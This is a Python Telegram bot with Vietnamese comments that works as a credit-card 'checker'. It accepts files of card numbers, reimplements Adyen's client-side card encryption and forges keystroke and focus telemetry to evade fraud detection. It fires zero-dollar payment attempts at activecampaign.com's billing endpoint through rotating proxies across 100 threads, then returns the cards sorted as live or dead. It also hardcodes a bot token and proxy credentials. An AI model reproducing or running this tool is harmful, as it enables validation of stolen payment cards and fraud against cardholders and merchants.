import os
import json
import hmac
import hashlib
import base64
import re
import string
import random
import sys
import time
import uuid
from datetime import datetime
import io
import threading
import queue
import psutil  # Thư viện check CPU/RAM
import telebot # Thư viện Telegram Bot

# Thư viện mã hóa
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_OAEP, AES
from Cryptodome.Util.Padding import pad
from jose import jwk

# Thư viện Request (PycURL)
import pycurl

# ===================================================================
# === CẤU HÌNH BOT TELEGRAM
# ===================================================================
API_TOKEN = '8110946929:AAGFn8gap9gMHH4_pABitcNd-saTGl24g0I'  # <--- THAY TOKEN CỦA BẠN VÀO ĐÂY
bot = telebot.TeleBot(API_TOKEN)

# Số luồng mặc định
DEFAULT_THREADS = 100

# ===================================================================
# === PHẦN 1: CÁC HÀM VALIDATION THẺ (GIỮ NGUYÊN)
# ===================================================================

def normalize_card(card_str):
    """Chuẩn hóa chuỗi thẻ về định dạng cc|mm|yyyy|cvv."""
    pattern = r'(\d{13,19})[|/:](\d{1,2})[|/:](\d{2,4})[|/:](\d{3,4})'
    match = re.search(pattern, card_str)
    if not match:
        return None
    card_num, month, year, cvv = match.groups()
    
    month_int = int(month)
    if month_int < 1 or month_int > 12:
        return None
    month = month.zfill(2)
    
    if len(year) == 2:
        year = '20' + year
    year_int = int(year)
    if year_int < 2000 or year_int > 2099:
        return None
        
    return f"{card_num}|{month}|{year}|{cvv}"

def validate_luhn(card_number):
    """Kiểm tra thuật toán Luhn cho số thẻ."""
    card_num = ''.join(filter(str.isdigit, str(card_number)))
    if not card_num or len(card_num) < 13 or len(card_num) > 19:
        return False
    total = 0
    reverse_digits = card_num[::-1]
    for i, digit in enumerate(reverse_digits):
        n = int(digit)
        if i % 2 == 1:
            n = n * 2
            if n > 9:
                n = n - 9
        total += n
    return total % 10 == 0

def get_short_brand_name(cc):
    first_digit = cc[0]
    if first_digit in ['5', '2']: return 'mc'
    elif first_digit == '4': return 'visa'
    elif cc.startswith('34') or cc.startswith('37'): return 'amex'
    elif cc.startswith('60') or cc.startswith('64') or cc.startswith('65'): return 'discover'
    elif cc.startswith('62'): return 'cup'
    elif cc.startswith('35'): return 'jcb'
    elif cc.startswith('30') or cc.startswith('36') or cc.startswith('38'): return 'diners'
    elif cc.startswith('67'): return 'maestro'
    else: return 'unknown'

# ===================================================================
# === PHẦN 2: LOGIC MÃ HÓA ADYEN (GIỮ NGUYÊN)
# ===================================================================

def get_current_timestamp():
    return datetime.utcnow().isoformat() + 'Z'

def generate_fake_log(input_len):
    log_entries = []
    current_time = random.randint(2000, 5000)
    log_entries.append(f"fo@{current_time}")
    current_time += random.randint(50, 200)
    log_entries.append(f"cl@{current_time}")
    current_time += random.randint(100, 300)
    for _ in range(input_len):
        log_entries.append(f"KN@{current_time}")
        current_time += random.randint(60, 180)
    return ",".join(log_entries)

def w(e):
    t = e
    if isinstance(t, str):
        t = t.encode('utf-8')
    return base64.b64encode(t).decode('utf-8')

def _(e):
    return w(e).replace('=', '').replace('+', '-').replace('/', '_')

def k(e):
    if not e:
        return bytearray(0)
    if len(e) % 2 == 1:
        e = "0" + e
    t = len(e) // 2
    r = bytearray(t)
    for n in range(t):
        r[n] = int(e[n*2:n*2+2], 16)
    return r

bt = 2**32

def mt(e, t, r):
    if not (0 <= t < bt):
        raise ValueError(f"value must be >= 0 and <= {bt - 1}. Received {t}")
    e[r:r+4] = [(t >> 24) & 0xff, (t >> 16) & 0xff, (t >> 8) & 0xff, t & 0xff]

class AdyenV4_8_0:
    def __init__(self, site_key):
        self.site_key = site_key
        self.key_object = None

    def generate_key(self):
        parts = self.site_key.split("|")
        if len(parts) != 2:
            raise ValueError("Malformed public key: incorrect split parts")
        part1 = parts[0]
        part2 = parts[1]
        decoded_part1 = k(part1)
        decoded_part2 = k(part2)
        encoded_part1 = _(decoded_part1)
        encoded_part2 = _(decoded_part2)
        self.key_object = {
            "kty": "RSA",
            "kid": "asf-key",
            "e": encoded_part1,
            "n": encoded_part2,
            "alg": "RSA-OAEP",
        }
        return self.key_object

    def encrypt_data(self, plain_text):
        public_key = jwk.construct(self.key_object)
        pem = public_key.to_pem().decode('utf-8')
        rsa_key = RSA.import_key(pem)
        random_bytes = os.urandom(64)
        cipher_rsa = PKCS1_OAEP.new(rsa_key)
        encrypted_key = cipher_rsa.encrypt(random_bytes)
        cek = random_bytes
        protected_header = {"alg":"RSA-OAEP","enc":"A256CBC-HS512","version":"1"}
        protected_header_b64 = _(json.dumps(protected_header).encode('utf-8'))
        _iv = os.urandom(16)
        _plaintext = json.dumps(plain_text).encode('utf-8')
        aes_key = cek[32:]
        hmac_key = cek[:32]
        cipher_aes = AES.new(aes_key, AES.MODE_CBC, _iv)
        padded_plaintext = pad(_plaintext, AES.block_size)
        ciphertext = cipher_aes.encrypt(padded_plaintext)
        protected_header2_bytes = protected_header_b64.encode('utf-8')
        f = len(protected_header2_bytes) * 8
        d = f // bt
        h_val = f % bt
        y = bytearray(8)
        mt(y, d, 0)
        mt(y, h_val, 4)
        hmac_obj = hmac.new(hmac_key, digestmod=hashlib.sha512)
        hmac_obj.update(protected_header2_bytes + _iv + ciphertext + y)
        tag = hmac_obj.digest()[:32]
        return f"{protected_header_b64}.{_(encrypted_key)}.{_(_iv)}.{_(ciphertext)}.{_(tag)}"

def format_card_number(card):
    return ' '.join(card[i:i+4] for i in range(0, len(card), 4))

def encrypt_card_data_480(card, month, year, cvc, adyen_key, stripe_key=None, domain=None):
    if not all([card, month, year, cvc, adyen_key]):
        raise ValueError("Missing card details or Adyen key")
    if not stripe_key:
        stripe_key = "live_2WKDYLJCMBFC5CFHBXY2CHZF4MUUJ7QU"
    if not domain:
        domain = "https://www.mytheresa.com"
    domain_b64 = base64.b64encode(domain.encode('utf-8')).decode('utf-8')
    referrer = f"https://checkoutshopper-live.adyen.com/checkoutshopper/securedfields/{stripe_key}/5.5.0/securedFields.html?type=card&d={domain_b64}"
    card_number = format_card_number(card)
    fake_number_log = generate_fake_log(16)
    fake_cvc_log = generate_fake_log(3)
    card_detail = {
        "encryptedCardNumber": {
            "number": card_number, 
            "generationtime": get_current_timestamp(), 
            "numberBind": "1", 
            "activate": "3", 
            "referrer": referrer, 
            "numberFieldFocusCount": "1", 
            "numberFieldLog": fake_number_log, 
            "numberFieldClickCount": "1", 
            "numberFieldKeyCount": "16"
        },
        "encryptedExpiryMonth": {"expiryMonth": month, "generationtime": get_current_timestamp()},
        "encryptedExpiryYear": {"expiryYear": year, "generationtime": get_current_timestamp()},
        "encryptedSecurityCode": {
            "cvc": cvc, 
            "generationtime": get_current_timestamp(), 
            "cvcBind": "1", 
            "activate": "4", 
            "referrer": referrer, 
            "cvcFieldFocusCount": "1", 
            "cvcFieldLog": fake_cvc_log, 
            "cvcFieldClickCount": "1", 
            "cvcFieldKeyCount": "3", 
            "cvcFieldChangeCount": "1", 
            "cvcFieldBlurCount": "1", 
            "deactivate": "2"
        }
    }
    adyen_encryptor = AdyenV4_8_0(adyen_key)
    adyen_encryptor.generate_key()
    encrypted_details = {}
    for key, value in card_detail.items():
        encrypted_details[key] = adyen_encryptor.encrypt_data(value)
    return encrypted_details

# ===================================================================
# === PHẦN 3: GENERATE DESKTOP PROFILE (GIỮ NGUYÊN)
# ===================================================================

def generate_browser_profile():
    chrome_version = random.randint(120, 131)
    user_agent = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36"
    return {
        "user_agent": user_agent,
        "sec_ch_ua": f'"Not_A Brand";v="8", "Chromium";v="{chrome_version}", "Google Chrome";v="{chrome_version}"',
        "platform": '"Windows"'
    }

def generate_checkout_attempt_id():
    uuid_part = str(uuid.uuid4())
    suffix = ''.join(random.choices(string.ascii_uppercase + string.digits, k=50))
    return f"{uuid_part}{suffix}"

# ===================================================================
# === PHẦN 4: HÀM CHECK THẺ (ĐIỀU CHỈNH ĐỂ RETURN KẾT QUẢ)
# ===================================================================

def check_card_process(line_card):
    start_time = time.time() # Bắt đầu đo thời gian
    
    # Chuẩn hóa
    line_card = line_card.strip()
    normalized = normalize_card(line_card)
    
    if not normalized:
        return "ERROR_FORMAT", f"{line_card} - Format Error", 0

    cc, mm, yyyy, cvc = normalized.split('|')

    if not validate_luhn(cc):
        return "ERROR_LUHN", f"{cc}|{mm}|{yyyy}|{cvc} - Luhn Failed", 0

    # Cấu hình API Key
    ADYEN_PUB_KEY = "10001|C740E51C2E7CEDAFC96AA470E575907B40E84E861C8AB2F4952423F704ABC29255A37C24DED6068F7D1E394100DAD0636A8362FC1A5AAE658BB9DA4262676D3BFFE126D0DF11C874DB9C361A286005280AD45C06876395FB60977C25BED6969A3A586CD95A3BE5BE2016A56A5FEA4287C9B4CAB685A243CFA04DC5C115E11C2473B5EDC595D3B97653C0EA42CB949ECDEA6BC60DC9EDF89154811B5E5EBF57FDC86B7949BA300F679716F67378361FF88E33E012F31DB8A14B00C3A3C2698D2CA6D3ECD9AE16056EE8E13DFFE2C99E1135BBFCE4718822AB8EA74BEBA4B1B99BBE43F2A6CC70882B6E5E1A917F8264180BE6CD7956967B9D8429BF9C0808004F"
    STRIPE_KEY = "live_CFDMTKEQ6RE5FPLXYTYYUGWJBUCBUWI7" 
    TARGET_DOMAIN = "https://www.activecampaign.com"

    # ================= RE-TRY LOGIC (MAX 20 LẦN) =================
    data = {}
    response_text = ""
    max_retries = 20
    current_try = 0
    success_request = False

    while current_try < max_retries:
        try:
            encrypted_result = encrypt_card_data_480(
                card=cc, month=mm, year=yyyy, cvc=cvc, 
                adyen_key=ADYEN_PUB_KEY, stripe_key=STRIPE_KEY, domain=TARGET_DOMAIN
            )

            profile = generate_browser_profile()
            email = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + '@gmail.com'
            city = 'New York' 
            telephoneNumber = ''.join(random.choices(string.digits, k=10))
            name = ''.join(random.choices(string.ascii_letters + ' ', k=10)).strip()
            attempt_id = generate_checkout_attempt_id()

            headers_list = [
                'accept: application/json, text/plain, */*',
                'accept-language: en-US,en;q=0.9',
                'cache-control: no-cache',
                'content-type: application/json',
                f'user-agent: {profile["user_agent"]}',
                f'sec-ch-ua: {profile["sec_ch_ua"]}',
                'sec-ch-ua-mobile: ?0',
                f'sec-ch-ua-platform: {profile["platform"]}',
                'origin: https://www.activecampaign.com',
                'pragma: no-cache',
                'referer: https://www.activecampaign.com/signup/?code=ac&tier=starter&contacts=1000&currency=USD',
                'sec-fetch-dest: empty',
                'sec-fetch-mode: cors',
                'sec-fetch-site: same-origin',
            ]

            json_data = {
                'paymentMethod': {
                    'type': 'scheme',
                    'holderName': name,
                    'encryptedCardNumber': encrypted_result['encryptedCardNumber'],
                    'encryptedExpiryMonth': encrypted_result['encryptedExpiryMonth'],
                    'encryptedExpiryYear': encrypted_result['encryptedExpiryYear'],
                    'encryptedSecurityCode': encrypted_result['encryptedSecurityCode'],
                    'brand': get_short_brand_name(cc),
                    'checkoutAttemptId': attempt_id,
                },
                'shopperEmail': email,
                'shopperName': name,
                'billingAddress': {'city': city, 'country': 'US', 'houseNumberOrName': '123', 'postalCode': '10001', 'stateOrProvince': 'NY', 'street': 'Broadway'},
                'telephoneNumber': telephoneNumber,
                'amount': {'value': 0, 'currency': 'USD'},
                'returnUrl': 'https://www.activecampaign.com/signup/?code=ac&tier=starter&contacts=1000&currency=USD',
            }

            post_body = json.dumps(json_data).encode('utf-8')

            buffer = io.BytesIO()
            c = pycurl.Curl()
            c.setopt(pycurl.URL, 'https://www.activecampaign.com/api/billing/adyen/payments')
            c.setopt(pycurl.POST, 1)
            c.setopt(pycurl.POSTFIELDS, post_body)
            c.setopt(pycurl.HTTPHEADER, headers_list)
            
            # Proxy
            session_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
            proxy_url = "http://aus.360s5.com:3600"
            base_auth = "88634867-zone-custom"
            pass_auth = "AetOKcLB"
            proxy_auth = f"{base_auth}-session-{session_id}:{pass_auth}"
            
            c.setopt(pycurl.PROXY, proxy_url)
            c.setopt(pycurl.PROXYUSERPWD, proxy_auth)
            c.setopt(pycurl.SSL_VERIFYPEER, 0)
            c.setopt(pycurl.SSL_VERIFYHOST, 0)
            c.setopt(pycurl.TIMEOUT, 30)
            c.setopt(pycurl.WRITEDATA, buffer)

            c.perform()
            c.close()

            response_text = buffer.getvalue().decode('utf-8')

            try:
                data = json.loads(response_text)
                success_request = True
                break
            except json.JSONDecodeError:
                pass

        except Exception as e:
            pass
        
        current_try += 1
        time.sleep(1)

    # Tính thời gian đã chạy
    end_time = time.time()
    time_taken = round(end_time - start_time, 2)

    # ================= XỬ LÝ KẾT QUẢ =================

    if not success_request:
        return "ERROR", f"{cc}|{mm}|{yyyy}|{cvc}|ERROR|NETWORK_FAIL|MAX_RETRIES|Time:{time_taken}s", time_taken

    additionalData = data.get('additionalData', {})
    cvcResultRaw = additionalData.get('cvcResultRaw', 'N/A')
    cvcResult = additionalData.get('cvcResult', 'N/A')
    avsResultRaw = additionalData.get('avsResultRaw', 'N/A')
    avsResult = additionalData.get('avsResult', 'N/A')
    refusalReasonRaw = additionalData.get('refusalReasonRaw', 'N/A')
    refusalReason = data.get('refusalReason', additionalData.get('refusalReason', 'N/A'))
    resultCode = data.get('resultCode', additionalData.get('resultCode', 'N/A'))
    message = data.get('message', 'N/A')

    if resultCode == "Authorised" or resultCode == "Cancelled":
        status = "LIVE"
        msg = "APPROVED ✅"
    elif resultCode == "Refused":
        status = "DIE"
        msg = f"DIE - {refusalReason}"
    elif resultCode in ["IdentifyShopper", "ChallengeShopper", "RedirectShopper"]:
        status = "DIE" # Coi như die nếu dính 3D (tùy nhu cầu, ở đây để DIE theo logic cũ)
        msg = "3DS - 3D Secure required"
    else:
        status = "DIE"
        msg = f"UNK - {message if message != 'N/A' else resultCode}"

    result_string = f"{cc}|{mm}|{yyyy}|{cvc}|{cvcResultRaw}|{cvcResult}|{avsResultRaw}|{avsResult}|{resultCode}|{refusalReasonRaw}|{msg}|Time:{time_taken}s"
    
    return status, result_string, time_taken

# ===================================================================
# === PHẦN 5: XỬ LÝ TELEGRAM BOT & ĐA LUỒNG
# ===================================================================

# Lưu trạng thái của các tác vụ đang chạy
tasks = {}

class CheckTask:
    def __init__(self, chat_id, message_id, file_path):
        self.chat_id = chat_id
        self.message_id = message_id
        self.file_path = file_path
        self.total = 0
        self.live = 0
        self.die = 0
        self.error = 0
        self.checked = 0
        self.start_time = time.time()
        self.is_running = True
        
        # Files kết quả
        self.live_file = f"live_{chat_id}.txt"
        self.die_file = f"die_{chat_id}.txt"
        
        # Xóa file cũ nếu có
        if os.path.exists(self.live_file): os.remove(self.live_file)
        if os.path.exists(self.die_file): os.remove(self.die_file)

    def update_stats(self, status, result_str):
        self.checked += 1
        if status == "LIVE":
            self.live += 1
            with open(self.live_file, "a", encoding="utf-8") as f:
                f.write(result_str + "\n")
        elif status == "DIE":
            self.die += 1
            with open(self.die_file, "a", encoding="utf-8") as f:
                f.write(result_str + "\n")
        else:
            self.error += 1
            # Error cũng ghi vào die file hoặc file riêng tùy ý, ở đây ghi vào die
            with open(self.die_file, "a", encoding="utf-8") as f:
                f.write(result_str + "\n")

    def get_cpm(self):
        elapsed = time.time() - self.start_time
        if elapsed < 1: return 0
        return int((self.checked / elapsed) * 60)

def bot_worker(q, task):
    while True:
        try:
            line = q.get(timeout=1)
        except queue.Empty:
            break
            
        try:
            status, result_str, t_taken = check_card_process(line)
            task.update_stats(status, result_str)
        except Exception as e:
            task.update_stats("ERROR", f"System Error: {e}")
        finally:
            q.task_done()

def monitor_thread(task):
    """Cập nhật tin nhắn Telegram mỗi giây"""
    while task.is_running:
        try:
            # Lấy thông số hệ thống
            cpu_usage = psutil.cpu_percent()
            ram_usage = psutil.virtual_memory().percent
            
            cpm = task.get_cpm()
            
            msg_text = (
                f"<b>🚀 PROCESSING...</b>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"💳 Total: {task.total}\n"
                f"✅ Live: {task.live}\n"
                f"💀 Die: {task.die}\n"
                f"⚠️ Error: {task.error}\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"⚡ CPM: {cpm}\n"
                f"🖥 CPU: {cpu_usage}% | RAM: {ram_usage}%\n"
                f"🔄 Progress: {task.checked}/{task.total}"
            )
            
            bot.edit_message_text(
                chat_id=task.chat_id,
                message_id=task.message_id,
                text=msg_text,
                parse_mode='HTML'
            )
            
            if task.checked >= task.total:
                break
                
            time.sleep(1.5) # Update mỗi 1.5s để tránh limit tele
        except Exception as e:
            time.sleep(1)

def run_checker(chat_id, file_path, message_id):
    task = CheckTask(chat_id, message_id, file_path)
    tasks[chat_id] = task
    
    # Đọc file
    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        cards = [line.strip() for line in f if line.strip()]
    
    task.total = len(cards)
    
    q = queue.Queue()
    for c in cards:
        q.put(c)
        
    # Tạo Thread Monitor
    t_monitor = threading.Thread(target=monitor_thread, args=(task,))
    t_monitor.start()
    
    # Tạo Thread Worker (100 luồng)
    threads = []
    for _ in range(DEFAULT_THREADS):
        t = threading.Thread(target=bot_worker, args=(q, task))
        t.start()
        threads.append(t)
        
    # Chờ Queue xong
    q.join()
    
    # Chờ Thread xong
    for t in threads:
        t.join()
        
    task.is_running = False
    t_monitor.join()
    
    # Gửi kết quả cuối cùng
    bot.edit_message_text(
        chat_id=chat_id,
        message_id=message_id,
        text=f"<b>✅ DONE!</b>\nChecked: {task.total}\nLive: {task.live}\nDie: {task.die}",
        parse_mode='HTML'
    )
    
    # Gửi file
    try:
        if task.live > 0:
            with open(task.live_file, 'rb') as f:
                bot.send_document(chat_id, f, caption="✅ LIVE CARDS")
        if task.die > 0:
            with open(task.die_file, 'rb') as f:
                bot.send_document(chat_id, f, caption="💀 DIE CARDS")
    except Exception as e:
        bot.send_message(chat_id, f"Error sending files: {e}")
        
    # Cleanup
    if os.path.exists(file_path): os.remove(file_path)
    if os.path.exists(task.live_file): os.remove(task.live_file)
    if os.path.exists(task.die_file): os.remove(task.die_file)
    del tasks[chat_id]

# ===================================================================
# === TELEGRAM HANDLERS
# ===================================================================

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    bot.reply_to(message, 
                 "🤖 <b>Adyen Checker Bot</b>\n\n"
                 "1. Gửi file .txt chứa thẻ để bắt đầu check (100 luồng).\n"
                 "2. Dùng lệnh <code>/st cc|mm|yy|cvv</code> để check lẻ.",
                 parse_mode='HTML')

@bot.message_handler(commands=['st'])
def check_single_card(message):
    try:
        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            bot.reply_to(message, "⚠️ Vui lòng nhập thẻ: <code>/st 444444|01|2025|123</code>", parse_mode='HTML')
            return
            
        card_input = args[1]
        msg = bot.reply_to(message, "⏳ Checking...")
        
        status, result_str, t_taken = check_card_process(card_input)
        
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=msg.message_id,
            text=f"<b>RESULT:</b>\n<code>{result_str}</code>",
            parse_mode='HTML'
        )
    except Exception as e:
        bot.reply_to(message, f"Error: {e}")

@bot.message_handler(content_types=['document'])
def handle_docs(message):
    try:
        # Kiểm tra đuôi file
        file_info = bot.get_file(message.document.file_id)
        if not file_info.file_path.endswith('.txt'):
            bot.reply_to(message, "⚠️ Chỉ nhận file .txt")
            return
            
        # Download file
        downloaded_file = bot.download_file(file_info.file_path)
        file_name = f"input_{message.chat.id}.txt"
        
        with open(file_name, 'wb') as new_file:
            new_file.write(downloaded_file)
            
        # Gửi tin nhắn khởi tạo
        init_msg = bot.reply_to(message, "⏳ Preparing to check...")
        
        # Chạy thread quản lý check
        t = threading.Thread(target=run_checker, args=(message.chat.id, file_name, init_msg.message_id))
        t.start()
        
    except Exception as e:
        bot.reply_to(message, f"Lỗi khi nhận file: {e}")

# ===================================================================
# === MAIN LOOP
# ===================================================================

if __name__ == '__main__':
    print(f"{datetime.now()} - Bot is running...")
    bot.infinity_polling()
